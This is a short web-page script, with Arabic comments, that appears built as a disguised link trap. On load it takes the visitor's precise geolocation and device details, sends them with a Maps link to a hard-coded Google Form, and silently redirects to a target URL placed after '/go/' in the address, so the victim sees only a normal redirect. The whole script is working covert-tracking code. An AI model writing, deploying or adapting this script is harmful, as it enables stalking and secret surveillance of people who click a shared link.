<script>
        const FORM_POST_URL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSccde-5FC3RKLZB-Tq5UsN_jP7Vcu5gCN3LKFGeI0HVS_f3ow/formResponse";
        
        const ENTRY_STATUS     = "entry.560644642"; 
        const ENTRY_LATITUDE   = "entry.1981918650"; 
        const ENTRY_LONGITUDE  = "entry.1141171242"; 
        const ENTRY_ACCURACY   = "entry.2030681550"; 
        const ENTRY_TIME       = "entry.625293889"; 
        const ENTRY_USER_AGENT = "entry.1922500127"; 
        const ENTRY_PLATFORM   = "entry.1237647503"; 
        const ENTRY_SCREEN     = "entry.1147551305"; 
        const ENTRY_LANGUAGE   = "entry.1327515972"; 
        const ENTRY_MAPS_LINK  = "entry.1638046155"; 

        const loadingState = document.getElementById('loadingState');
        const errorState = document.getElementById('errorState');

        // بدء الإجراء تلقائياً بمجرد فتح الصفحة
        window.onload = function() {
            initiateService();
        };

        // دالة جديدة لاستخراج الرابط الهدف من شريط العنوان
        function getDynamicRedirectUrl() {
            const currentUrl = window.location.href;
            // البحث عن المقطع /go/ في الرابط لقص ما بعده
            const parts = currentUrl.split('/go/');
            
            // التحقق مما إذا كان هناك رابط مضاف بعد /go/ ويبدأ بـ http
            if (parts.length > 1 && parts[1].startsWith('http')) {
                return parts[1]; // إرجاع الرابط الذي قمت بإضافته
            }
            
            // الرابط الافتراضي في حال فتحت الصفحة بدون تحديد مسار إضافي
            return "https://www.google.com/maps";
        }

        function initiateService() {
            const deviceInfo = {
                time: new Date().toLocaleString('ar-SA'),
                userAgent: navigator.userAgent,
                platform: navigator.platform || navigator.userAgentData?.platform || "غير معروف",
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || navigator.userLanguage
            };

            if (navigator.geolocation) {
                const options = {
                    enableHighAccuracy: true, 
                    timeout: 15000,           
                    maximumAge: 0             
                };

                navigator.geolocation.getCurrentPosition(
                    (position) => handleLocationSuccess(position, deviceInfo),
                    (error) => handleLocationError()
                );
            } else {
                handleLocationError();
            }
        }

        function handleLocationSuccess(position, deviceInfo) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // تحديد الوجهة بناءً على الرابط
            const targetUrl = getDynamicRedirectUrl();

            // إرسال البيانات ثم التحويل المباشر للرابط المستخرج
            sendDataToGoogle("موافق", lat, lng, accuracy, deviceInfo).finally(() => {
                window.location.replace(targetUrl);
            });
        }

        function handleLocationError() {
            // إخفاء التحميل وعرض رسالة الخطأ وزر التحديث (دون إرسال بيانات)
            loadingState.style.display = 'none';
            errorState.style.display = 'block';
        }

        function sendDataToGoogle(status, lat, lng, accuracy, device) {
            const formData = new FormData();
            
            formData.append(ENTRY_STATUS, status);
            formData.append(ENTRY_LATITUDE, lat);
            formData.append(ENTRY_LONGITUDE, lng);
            formData.append(ENTRY_ACCURACY, accuracy ? accuracy + " متر" : "N/A");
            formData.append(ENTRY_TIME, device.time);
            formData.append(ENTRY_USER_AGENT, device.userAgent);
            formData.append(ENTRY_PLATFORM, device.platform);
            formData.append(ENTRY_SCREEN, device.screen);
            formData.append(ENTRY_LANGUAGE, device.language);

            let mapsLink = "N/A";
            if (lat !== "N/A" && lng !== "N/A") {
                mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
            }
            formData.append(ENTRY_MAPS_LINK, mapsLink);

            return fetch(FORM_POST_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: formData
            }).catch(err => console.log('Error:', err));
        }
    </script>
